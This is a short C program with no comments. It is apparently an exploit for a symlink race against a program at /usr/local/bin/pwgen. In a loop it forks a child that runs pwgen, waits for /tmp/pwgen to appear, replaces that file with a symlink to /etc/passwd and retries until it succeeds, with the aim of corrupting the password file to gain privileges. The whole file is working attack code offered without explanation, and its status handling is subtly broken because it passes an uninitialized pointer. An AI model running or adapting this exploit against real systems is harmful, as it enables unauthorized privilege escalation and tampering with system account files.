#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <pwd.h>
#include <errno.h>
#include <limits.h>
#include <openssl/rand.h>
#include <shadow.h>
#include <crypt.h>
#include <getopt.h>

int main(int argc, char const *argv[])
{
	pid_t pid;
	int* status;

	while(1){
		pid = fork();
		if(pid == 0){
			system("/usr/local/bin/pwgen -e");
		}else{
			while(access("/tmp/pwgen",0) != 0){}
			system("rm -f /tmp/pwgen");
			if(symlink("/etc/passwd","/tmp/pwgen") != 0){
				printf("fail\n");
			}
			waitpid(0,status,NULL);
			if(WIFEXITED(status) && WEXITSTATUS(status)){
				system("rm -f /tmp/pwgen");
				continue;
			}
			
		}
	}
	return 0;
}